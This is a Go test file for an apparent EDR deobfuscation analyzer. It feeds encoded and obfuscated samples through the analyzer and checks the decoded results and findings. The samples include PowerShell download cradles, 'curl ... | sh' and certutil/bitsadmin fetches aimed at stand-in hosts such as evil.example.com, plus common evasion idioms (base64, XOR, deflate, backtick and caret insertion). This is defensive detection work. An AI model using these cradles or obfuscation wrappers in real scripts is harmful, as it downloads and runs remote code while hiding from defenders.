// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"compress/zlib"
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"testing"
	"time"
	"unicode/utf16"
)

const deobPayload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"

func deobUTF16(s string) []byte {
	var out []byte
	for _, u := range utf16.Encode([]rune(s)) {
		out = append(out, byte(u), byte(u>>8))
	}
	return out
}

func deobGzip(t testing.TB, data []byte) []byte {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	zw.Write(data)
	zw.Close()
	return buf.Bytes()
}

func deobDeflate(data []byte) []byte {
	var buf bytes.Buffer
	fw, _ := flate.NewWriter(&buf, 9)
	fw.Write(data)
	fw.Close()
	return buf.Bytes()
}

func deobFinal(t *testing.T, in string) (string, *deobResult) {
	t.Helper()
	res := deobRun(context.Background(), in)
	if len(res.Layers) == 0 {
		t.Fatalf("no layers decoded from %q", in)
	}
	return res.Layers[len(res.Layers)-1].Text, res
}

func wantContains(t *testing.T, got, want string) {
	t.Helper()
	if !strings.Contains(got, want) {
		t.Fatalf("want %q in %q", want, got)
	}
}

func TestDeobBase64Variants(t *testing.T) {
	text := "echo this is a long enough payload; curl http://evil.example.com/x?a=1&b=2~"
	for name, enc := range map[string]string{
		"std":      base64.StdEncoding.EncodeToString([]byte(text)),
		"url-safe": base64.URLEncoding.EncodeToString([]byte(text)),
		"unpadded": base64.RawStdEncoding.EncodeToString([]byte(text)),
	} {
		out, res := deobFinal(t, "run "+enc)
		wantContains(t, out, "curl http://evil.example.com")
		if res.Layers[0].Methods[0] != "base64" {
			t.Fatalf("%s: methods %v", name, res.Layers[0].Methods)
		}
	}
}

func TestDeobPowerShellEncodedCommand(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString(deobUTF16(deobPayload))
	for _, flag := range []string{"-enc", "-EncodedCommand", "-ec", "-e"} {
		out, _ := deobFinal(t, "powershell.exe -NoP "+flag+" "+enc)
		wantContains(t, out, "DownloadString('http://evil.example.com/a.ps1')")
	}
}

func TestDeobHexForms(t *testing.T) {
	out, _ := deobFinal(t, "x = '"+hex.EncodeToString([]byte(deobPayload))+"'")
	wantContains(t, out, "evil.example.com")
	var esc strings.Builder
	for _, c := range []byte("cmd.exe /c whoami") {
		fmt.Fprintf(&esc, "\\x%02x", c)
	}
	out, _ = deobFinal(t, "s = \""+esc.String()+"\"")
	wantContains(t, out, "cmd.exe /c whoami")
	var lst []string
	for _, c := range []byte("cmd.exe /c whoami") {
		lst = append(lst, fmt.Sprintf("0x%02X", c))
	}
	out, _ = deobFinal(t, "{"+strings.Join(lst, ",")+"}")
	wantContains(t, out, "cmd.exe /c whoami")
}

func TestDeobCharCodes(t *testing.T) {
	var ps, vba, lst []string
	for _, c := range []byte("Invoke-Expression") {
		ps = append(ps, fmt.Sprintf("[char]%d", c))
		vba = append(vba, fmt.Sprintf("Chr(%d)", c))
		lst = append(lst, fmt.Sprint(c))
	}
	out, _ := deobFinal(t, strings.Join(ps, "+"))
	wantContains(t, out, "Invoke-Expression")
	out, _ = deobFinal(t, "x = "+strings.Join(vba, " & "))
	wantContains(t, out, "Invoke-Expression")
	out, _ = deobFinal(t, "-join ([char[]]("+strings.Join(lst, ",")+"))")
	wantContains(t, out, "Invoke-Expression")
}

func TestDeobReversalAndVBA(t *testing.T) {
	rev := reverseStr("powershell -nop -w hidden")
	out, _ := deobFinal(t, `x = StrReverse("`+rev+`")`)
	wantContains(t, out, "powershell -nop -w hidden")
	out, _ = deobFinal(t, "exec('"+reverseStr("import os; os.system('id')")+"'[::-1])")
	wantContains(t, out, "import os")
	out, _ = deobFinal(t, "$s = '"+reverseStr("Invoke-Expression")+"'")
	wantContains(t, out, "Invoke-Expression")
	out, _ = deobFinal(t, reverseStr("IEX (New-Object Net.WebClient).DownloadString('http://a.example.org/x')"))
	wantContains(t, out, "DownloadString")
}

func TestDeobConcatJoinFormat(t *testing.T) {
	out, _ := deobFinal(t, "&('Inv'+'oke-'+'Expres'+'sion') $x")
	wantContains(t, out, "'Invoke-Expression'")
	out, _ = deobFinal(t, `('Inv','oke-','Expression' -join '') $x`)
	wantContains(t, out, "'Invoke-Expression'")
	out, _ = deobFinal(t, `-join('Inv','oke-Expr','ession')`)
	wantContains(t, out, "'Invoke-Expression'")
	out, _ = deobFinal(t, `('{1}{0}{2}' -f 'oke-Exp','Inv','ression') $x`)
	wantContains(t, out, "'Invoke-Expression'")
	out, _ = deobFinal(t, `x = "Wscr" & "ipt.Sh" & "ell"`)
	wantContains(t, out, `"Wscript.Shell"`)
}

func TestDeobInsertions(t *testing.T) {
	out, _ := deobFinal(t, "I`nv`o`ke-Ex`pres`sion $x")
	wantContains(t, out, "Invoke-Expression")
	out, _ = deobFinal(t, "p^o^w^e^r^s^h^e^l^l -nop")
	wantContains(t, out, "powershell -nop")
	out, _ = deobFinal(t, `c"m"d /c who"a"mi`)
	wantContains(t, out, "cmd /c whoami")
	out, _ = deobFinal(t, `w'h'o'a'mi`)
	wantContains(t, out, "whoami")
}

func TestDeobURLEncoding(t *testing.T) {
	out, _ := deobFinal(t, deobPctEncode("cmd /c powershell -nop -w hidden"))
	wantContains(t, out, "cmd /c powershell")
}

func TestDeobCompressedPowerShellIdiom(t *testing.T) {
	for name, comp := range map[string][]byte{"deflate": deobDeflate([]byte(deobPayload)), "gzip": deobGzip(t, []byte(deobPayload))} {
		enc := base64.StdEncoding.EncodeToString(comp)
		ps := "IEX(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('" + enc + "'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
		out, res := deobFinal(t, ps)
		if !strings.Contains(out, "evil.example.com") {
			t.Fatalf("%s: %q", name, out)
		}
		if !strings.Contains(strings.Join(res.Layers[0].Methods, ","), name) {
			t.Fatalf("%s: methods %v", name, res.Layers[0].Methods)
		}
	}
	var buf bytes.Buffer
	zw := zlib.NewWriter(&buf)
	zw.Write([]byte(deobPayload))
	zw.Close()
	out, _ := deobFinal(t, "z = '"+base64.StdEncoding.EncodeToString(buf.Bytes())+"'")
	wantContains(t, out, "evil.example.com")
}

func TestDeobFromBase64NoStream(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte(deobPayload))
	out, _ := deobFinal(t, "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('"+enc+"')))")
	wantContains(t, out, "evil.example.com")
}

func TestDeobXOR(t *testing.T) {
	raw := []byte(deobPayload)
	for i := range raw {
		raw[i] ^= 0x5a
	}
	out, res := deobFinal(t, "blob="+base64.StdEncoding.EncodeToString(raw))
	wantContains(t, out, "evil.example.com")
	if !strings.Contains(strings.Join(res.Layers[0].Methods, ","), "xor-0x5a") {
		t.Fatalf("methods %v", res.Layers[0].Methods)
	}
	// random bytes must not "decode" under XOR
	rnd := make([]byte, 300)
	for i := range rnd {
		rnd[i] = byte(i*131 + 7)
	}
	if r := deobRun(context.Background(), base64.StdEncoding.EncodeToString(rnd)); len(r.Layers) != 0 {
		t.Fatalf("random data decoded: %+v", r.Layers)
	}
}

func TestDeobShellAndPython(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("curl -s http://evil.example.com/s.sh | sh"))
	out, _ := deobFinal(t, "echo "+enc+" | base64 -d | bash")
	wantContains(t, out, "curl -s http://evil.example.com")
	out, _ = deobFinal(t, "eval $(echo "+enc+" | base64 -d)")
	if strings.Contains(out, "eval") || !strings.Contains(out, "curl -s") {
		t.Fatalf("eval wrapper not removed: %q", out)
	}
	py := base64.StdEncoding.EncodeToString(deobDeflateZlib(t, "import socket,os\nos.system('id')"))
	out, _ = deobFinal(t, "import base64,zlib\nexec(zlib.decompress(base64.b64decode('"+py+"')))")
	wantContains(t, out, "import socket")
	py2 := base64.StdEncoding.EncodeToString([]byte("import socket\nimport os\nos.system('id')"))
	out, _ = deobFinal(t, "exec(__import__('base64').b64decode('"+py2+"').decode())")
	wantContains(t, out, "os.system")
}

func deobDeflateZlib(t testing.TB, s string) []byte {
	var buf bytes.Buffer
	zw := zlib.NewWriter(&buf)
	zw.Write([]byte(s))
	zw.Close()
	return buf.Bytes()
}

func TestDeobNestedMultiLayer(t *testing.T) {
	inner := "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')"
	l1 := "powershell -nop -w hidden -enc " + base64.StdEncoding.EncodeToString(deobUTF16(inner))
	l2 := "echo " + base64.StdEncoding.EncodeToString([]byte(l1)) + " | base64 -d | sh"
	res := deobRun(context.Background(), deobPctEncode(l2))
	if len(res.Layers) < 3 {
		t.Fatalf("want >=3 layers, got %d: %+v", len(res.Layers), res.Layers)
	}
	last := res.Layers[len(res.Layers)-1].Text
	wantContains(t, last, "203.0.113.9/p.ps1")
}

func TestDeobBombCapped(t *testing.T) {
	bomb := deobDeflate(bytes.Repeat([]byte("A"), scaleN(64<<20, 8<<20))) // ~64KB compressed -> 64MB
	enc := base64.StdEncoding.EncodeToString(bomb)
	start := time.Now()
	res := deobRun(context.Background(), "x="+enc)
	if time.Since(start) > 5*time.Second {
		t.Fatalf("bomb took too long")
	}
	hit := false
	for _, l := range res.Limits {
		if l == "decompression-cap" {
			hit = true
		}
	}
	if !hit {
		t.Fatalf("bomb not flagged: %v", res.Limits)
	}
	for _, l := range res.Layers {
		if len(l.Text) > deobMaxBlob+1024 {
			t.Fatalf("output exceeds cap: %d", len(l.Text))
		}
	}
}

func TestDeobGarbageAndEmpty(t *testing.T) {
	for _, in := range []string{"", "   ", "\x00\x01\x02\xff\xfe", strings.Repeat("A", 5000), strings.Repeat("%", 100), strings.Repeat("`", 50), "[char]", "-enc", "'+'+'", strings.Repeat("=", 100)} {
		res := deobRun(context.Background(), in)
		if res == nil {
			t.Fatal("nil result")
		}
	}
}

func TestDeobRecursionLimit(t *testing.T) {
	s := "echo hello world this is the core payload; powershell -nop"
	for i := 0; i < InspectMaxDepth+6; i++ {
		s = base64.StdEncoding.EncodeToString([]byte("echo " + s))
	}
	res := deobRun(context.Background(), s)
	if len(res.Layers) > InspectMaxDepth {
		t.Fatalf("layers %d exceed max depth", len(res.Layers))
	}
	hit := false
	for _, l := range res.Limits {
		hit = hit || l == "max-depth"
	}
	if !hit {
		t.Fatalf("max-depth not reported: %v", res.Limits)
	}
}

func runDeob(t *testing.T, kind, text string) *InspectReport {
	t.Helper()
	if err := LoadContentPacks(); err != nil {
		t.Logf("content pack warnings: %v", err)
	}
	withAnalyzers(t, an("deobfuscation", []string{InspectKindScript, InspectKindCmdline}, analyzeDeob))
	return RunAnalyzers(context.Background(), InspectInput{Kind: kind, Text: text})
}

func TestDeobAnalyzerFindingsAndIOCs(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString(deobUTF16(deobPayload))
	r := runDeob(t, InspectKindCmdline, "powershell.exe -NoP -W Hidden -enc "+enc)
	if len(r.Layers) == 0 {
		t.Fatalf("no layers logged")
	}
	foundURL := false
	for _, i := range r.IOCs {
		if i.Type == "url" && strings.Contains(i.Value, "evil.example.com/a.ps1") {
			foundURL = true
		}
	}
	if !foundURL {
		t.Fatalf("url IOC missing: %+v", r.IOCs)
	}
	ids := map[string]bool{}
	for _, f := range r.Findings {
		ids[f.ID] = true
		if !strings.HasPrefix(f.ID, "deob-") || f.Analyzer != "deobfuscation" {
			t.Fatalf("bad finding %+v", f)
		}
	}
	if !ids["deob-cradle-downloadstring"] {
		t.Fatalf("cradle not reported: %v", ids)
	}
}

func TestDeobRuleAttributionOnDecodedLayer(t *testing.T) {
	// A rule that fires on the decoded text but not on the encoded original is
	// reported with its id. Find one from the loaded packs.
	if err := LoadContentPacks(); err != nil {
		t.Logf("warnings: %v", err)
	}
	var cmd, wantID string
	for _, r := range ContentRules() {
		if r.EventType != "process" || r.PendingTelemetry || r.Tests == nil {
			continue
		}
		for _, p := range r.Tests.Positive {
			if p.Command == "" || len(p.Command) > 300 || strings.ContainsAny(p.Command, "\n") {
				continue
			}
			enc := base64.StdEncoding.EncodeToString([]byte(p.Command))
			if _, hit := deobRuleHits("echo " + enc)[r.ID]; hit {
				continue
			}
			rep := runDeobPlain(t, "echo "+enc+" | base64 -d | sh")
			for _, f := range rep.Findings {
				if f.ID == "deob-"+r.ID {
					cmd, wantID = p.Command, r.ID
				}
			}
			if wantID != "" {
				break
			}
		}
		if wantID != "" {
			break
		}
	}
	if wantID == "" {
		t.Fatal("no content rule fired through the decoder; attribution path broken")
	}
	rep := runDeobPlain(t, "echo "+base64.StdEncoding.EncodeToString([]byte(cmd))+" | base64 -d | sh")
	for _, f := range rep.Findings {
		if f.ID == "deob-"+wantID {
			if f.Technique == "" || f.Weight == 0 || !strings.Contains(f.Title, wantID) {
				t.Fatalf("incomplete finding %+v", f)
			}
			return
		}
	}
	t.Fatal("finding vanished")
}

func runDeobPlain(t *testing.T, text string) *InspectReport {
	t.Helper()
	withAnalyzers(t, an("deobfuscation", []string{InspectKindScript, InspectKindCmdline}, analyzeDeob))
	return RunAnalyzers(context.Background(), InspectInput{Kind: InspectKindCmdline, Text: text})
}

func TestDeobObfuscationAloneIsNotAVerdict(t *testing.T) {
	// every obfuscation-only signal at once: layers, mixed techniques, xor,
	// compression, cradles, high entropy blob
	raw := []byte(deobPayload + "; certutil -urlcache -f http://a.example.net/x x; curl http://a.example.net/y | sh; bitsadmin /transfer j http://a.example.net/z c:\\z")
	comp := deobDeflate(raw)
	for i := range comp {
		comp[i] ^= 0x21
	}
	l1 := "x=" + base64.StdEncoding.EncodeToString(comp)
	r := runDeob(t, InspectKindScript, "I`nv`ok`e "+l1)
	obf := 0
	for _, f := range r.Findings {
		if f.ID == "deob-layers" || f.ID == "deob-mixed-techniques" || f.ID == "deob-xor-payload" || f.ID == "deob-compressed-payload" || strings.HasPrefix(f.ID, "deob-cradle") || f.ID == "deob-high-entropy-blob" {
			obf += f.Weight
		}
	}
	if obf > deobObfWeightBudget {
		t.Fatalf("obfuscation-only weight %d exceeds budget", obf)
	}
	// also with a plain (non-xor) layered blob
	plain := base64.StdEncoding.EncodeToString([]byte("curl http://a.example.net/y | sh ; " + deobPayload))
	r = runDeob(t, InspectKindScript, "echo "+plain+" | base64 -d | sh")
	sum := 0
	for _, f := range r.Findings {
		if !strings.HasPrefix(f.ID, "deob-") {
			t.Fatalf("foreign finding id %s", f.ID)
		}
		if strings.HasPrefix(f.ID, "deob-cradle") || strings.HasPrefix(f.ID, "deob-layers") {
			sum += f.Weight
		}
	}
	if sum > deobObfWeightBudget {
		t.Fatalf("cradle+layer weight %d", sum)
	}
}

func TestDeobBenignLongScriptIsClean(t *testing.T) {
	var sb strings.Builder
	sb.WriteString("#!/usr/bin/env bash\nset -euo pipefail\n# Nightly backup helper\n")
	for i := 0; i < 400; i++ {
		fmt.Fprintf(&sb, "backup_dir_%d=\"/var/backups/app-%d\"\nif [ -d \"$backup_dir_%d\" ]; then echo \"Backing up %d\" >> /var/log/backup.log; fi\n", i, i, i, i)
	}
	sb.WriteString("MSG=\"Backup \" + \"complete\"\nrsync -a /data/ \"$DEST/\" --exclude='*.tmp'\n")
	sb.WriteString("# docs: https://docs.example.com/backup and sha256 " + strings.Repeat("ab12", 16) + "\n")
	sb.WriteString("printf 'a%20b%20c%20d%20e\\n'\n")
	sb.WriteString("curl -fsSL https://docs.example.com/health -o /tmp/health.json\n")
	r := runDeob(t, InspectKindScript, sb.String())
	if r.Level != "clean" || r.Score >= 15 {
		t.Fatalf("benign script not clean: score %d level %s factors %v", r.Score, r.Level, r.Factors)
	}
	for _, f := range r.Findings {
		t.Logf("finding %s w=%d", f.ID, f.Weight)
	}
}

func TestDeobPlainBenignCmdline(t *testing.T) {
	for _, c := range []string{"ls -la /var/log", "powershell.exe -NoProfile -File C:\\ops\\backup.ps1", "git commit -m \"fix: a\" && echo done"} {
		r := runDeob(t, InspectKindCmdline, c)
		if r.Score != 0 || len(r.Layers) != 0 {
			t.Fatalf("%q: score %d layers %d findings %+v", c, r.Score, len(r.Layers), r.Findings)
		}
	}
}

func TestDeobContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	enc := base64.StdEncoding.EncodeToString([]byte(deobPayload))
	res := deobRun(ctx, enc)
	if len(res.Layers) != 0 {
		t.Fatalf("decoded after cancel")
	}
}

func FuzzDeobChain(f *testing.F) {
	enc := base64.StdEncoding.EncodeToString(deobUTF16(deobPayload))
	for _, s := range []string{
		"powershell -enc " + enc, "echo " + enc + " | base64 -d | sh", "I`nv`oke", "[char]72+[char]101+[char]108",
		"('a'+'b')", "'{1}{0}' -f 'a','b'", "%41%42%43%44", "p^o^w^e^r", `StrReverse("abc")`, "exec(base64.b64decode('QUJD'))",
		"\\x41\\x42\\x43\\x44", strings.Repeat("A", 64), "",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		res := deobRun(ctx, s)
		if len(res.Layers) > InspectMaxDepth {
			t.Fatalf("too many layers")
		}
		for _, l := range res.Layers {
			if len(l.Text) > deobMaxText {
				t.Fatalf("layer too large")
			}
		}
	})
}

func deobPctEncode(s string) string {
	var sb strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' {
			sb.WriteByte(c)
		} else {
			fmt.Fprintf(&sb, "%%%02X", c)
		}
	}
	return sb.String()
}
